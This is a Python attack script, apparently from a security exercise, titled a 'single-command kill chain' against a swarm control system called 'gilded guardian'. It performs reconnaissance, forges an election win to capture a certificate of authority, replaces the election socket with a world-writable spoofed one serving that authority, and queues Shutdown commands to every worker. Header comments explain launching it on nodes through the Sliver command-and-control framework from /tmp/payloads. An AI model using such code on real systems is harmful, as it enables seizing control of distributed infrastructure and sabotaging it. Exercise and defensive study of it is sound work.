#!/usr/bin/env python3
# USAGE ON SWARM NODES (NixOS):
#   Upload to /tmp/payloads/00_one_shot.py, then run it with the full Python path:
#     /run/current-system/sw/bin/python3 /tmp/payloads/00_one_shot.py [args]
#   If launching through Sliver, use:
#     execute -o /run/current-system/sw/bin/python3 -- /tmp/payloads/00_one_shot.py [args]
#   Common helper binaries are also under /run/current-system/sw/bin/, e.g.:
#     /run/current-system/sw/bin/cat
#     /run/current-system/sw/bin/ls
#     /run/current-system/sw/bin/bash
"""
offense/00_one_shot.py

Single-command kill chain:
  1. recon -> /tmp/recon.json
  2. check local leadership
  3. if needed, win election -> /tmp/captured_coa.json
  4. if needed, serve captured COA on election socket
  5. queue Shutdown to all workers
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gg_core  # noqa: E402


def win_election(recon: dict, term: int, vote_wait: float = 8.0, endorse_wait: float = 8.0) -> gg_core.Authority | None:
    peers = recon.get("peer_controllers", []) or []
    quorum = (len(peers) + 1) // 2 + 1
    print(f"[elect] term={term} peers={len(peers)} quorum={quorum}")

    comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    comms.settimeout(2.0)
    try:
        comms.connect(recon["comms_socket"])
    except OSError as e:
        print(gg_core.format_socket_error(recon.get("comms_socket", "<missing>"), e, action="connect to"))
        comms.close()
        return None

    vote_payload = {"leader": recon["our_uuid"], "term": term}
    for peer in peers:
        uuid = peer.get("uuid", "")
        if uuid:
            comms.sendall(gg_core.make_election_tx(recon["our_uuid"], uuid, gg_core.ELECTION_VOTE_REQUEST, vote_payload))
    print("[elect] sent vote requests")

    votes = 1
    endorsements: list[dict] = []
    deadline = time.time() + vote_wait
    buf = b""
    while time.time() < deadline:
        try:
            chunk = comms.recv(65536)
        except socket.timeout:
            if votes >= quorum:
                break
            continue
        if not chunk:
            break
        buf += chunk
        consumed = 0
        for line in gg_core.iter_ndjson(buf):
            consumed += len(line) + 1
            try:
                tx = gg_core.Transmission.from_json_bytes(line)
            except Exception:
                continue
            payload, _ = tx.decode_payload()
            if not isinstance(payload, dict):
                continue
            if tx.msg_type == gg_core.ELECTION_VOTE_RESPONSE and payload.get("vote_granted"):
                votes += 1
                print(f"[elect] vote granted by {tx.source[:8]} ({votes}/{quorum})")
            elif tx.msg_type == gg_core.ELECTION_ENDORSE_RESPONSE:
                endorsement = payload.get("endorsement") or {}
                if endorsement:
                    endorsements.append(endorsement)
        buf = buf[consumed:]
        if votes >= quorum:
            break

    if votes < quorum:
        print(f"[!] quorum not reached ({votes}/{quorum})")
        comms.close()
        return None

    endorse_payload = {"term": term}
    for peer in peers:
        uuid = peer.get("uuid", "")
        if uuid:
            comms.sendall(gg_core.make_election_tx(recon["our_uuid"], uuid, gg_core.ELECTION_ENDORSE_REQUEST, endorse_payload))
    print("[elect] sent endorsement requests")

    deadline = time.time() + endorse_wait
    while time.time() < deadline:
        try:
            chunk = comms.recv(65536)
        except socket.timeout:
            if len(endorsements) >= quorum - 1:
                break
            continue
        if not chunk:
            break
        buf += chunk
        consumed = 0
        for line in gg_core.iter_ndjson(buf):
            consumed += len(line) + 1
            try:
                tx = gg_core.Transmission.from_json_bytes(line)
            except Exception:
                continue
            payload, _ = tx.decode_payload()
            if tx.msg_type == gg_core.ELECTION_ENDORSE_RESPONSE and isinstance(payload, dict):
                endorsement = payload.get("endorsement") or {}
                if endorsement:
                    endorsements.append(endorsement)
                    print(f"[elect] endorsement from {endorsement.get('endorser','?')[:8]}")
        buf = buf[consumed:]

    comms.close()
    if not endorsements:
        return None
    coa = gg_core.Authority.from_dict({"endorsements": endorsements})
    gg_core.save_coa(coa)
    return coa


def serve_coa(election_sock: str, coa_bytes: bytes, stop: threading.Event) -> None:
    try:
        os.unlink(election_sock)
    except (FileNotFoundError, PermissionError):
        pass
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        srv.bind(election_sock)
        os.chmod(election_sock, 0o777)
        srv.listen(64)
        srv.settimeout(0.5)
    except OSError as e:
        print(gg_core.format_socket_error(election_sock, e, action="bind/listen on"))
        srv.close()
        stop.set()
        return
    print(f"[coa-srv] serving captured COA at {election_sock}")
    while not stop.is_set():
        try:
            conn, _ = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            conn.sendall(coa_bytes)
        except OSError:
            pass
        finally:
            conn.close()
    srv.close()


def kill_workers(recon: dict, coa: gg_core.Authority) -> int:
    workers = gg_core.worker_uuids(recon)
    comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        comms.connect(recon["comms_socket"])
    except OSError as e:
        print(gg_core.format_socket_error(recon.get("comms_socket", "<missing>"), e, action="connect to"))
        comms.close()
        return -1
    for worker in workers:
        comms.sendall(gg_core.make_shutdown_tx(recon["our_uuid"], worker, coa, b64_payload=True))
        comms.sendall(gg_core.make_shutdown_tx(recon["our_uuid"], worker, coa, b64_payload=False))
    comms.close()
    return len(workers)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--term", type=int, default=99999)
    ap.add_argument("--coa-serve-s", type=int, default=20, help="seconds to keep COA server alive after kill")
    ap.add_argument("--skip-replace", action="store_true", help="never replace the election socket; trust real daemon")
    args = ap.parse_args()

    print("=== gilded guardian one-shot ===")
    recon = gg_core.do_recon()
    print(
        f"[recon] role={recon['role']} our_uuid={recon['our_uuid'][:8]} "
        f"controllers={len(recon['peer_controllers'])} sensors={len(recon['sensors'])} "
        f"boomers={len(recon['boomers'])}"
    )
    if not recon.get("our_uuid") or not recon.get("comms_socket") or not recon.get("election_socket"):
        raise SystemExit("[!] recon is missing one or more required fields: our_uuid, comms_socket, election_socket")
    if recon["role"] != "controller":
        raise SystemExit(f"[!] role={recon['role']}; need a controller; aborting")

    coa = gg_core.read_coa(recon["election_socket"])
    print(f"[lead] current endorsements on local socket: {len(coa.endorsements)}")
    if coa.is_empty():
        coa = win_election(recon, args.term)
        if coa is None or coa.is_empty():
            raise SystemExit("[!] election win failed; cannot proceed")
        time.sleep(1.0)
        live = gg_core.read_coa(recon["election_socket"])
        replace_needed = live.is_empty() and not args.skip_replace
    else:
        replace_needed = False

    stop = threading.Event()
    if replace_needed:
        coa_bytes = json.dumps(coa.to_dict()).encode("utf-8")
        t = threading.Thread(target=serve_coa, args=(recon["election_socket"], coa_bytes, stop), daemon=True)
        t.start()
        time.sleep(1.0)
        if stop.is_set():
            raise SystemExit("[!] failed to stand up replacement election socket; cannot proceed")

    count = kill_workers(recon, coa)
    if count < 0:
        raise SystemExit("[!] failed to queue Shutdowns because the comms socket was unavailable")
    print(f"[kill] queued Shutdown for {count} workers (both encodings)")
    print(f"[kill] holding for {args.coa_serve_s}s for poll-return delivery...")
    time.sleep(args.coa_serve_s)
    stop.set()
    print("=== one-shot complete ===")
    return 0


if __name__ == "__main__":
    sys.exit(gg_core.run_main(main))
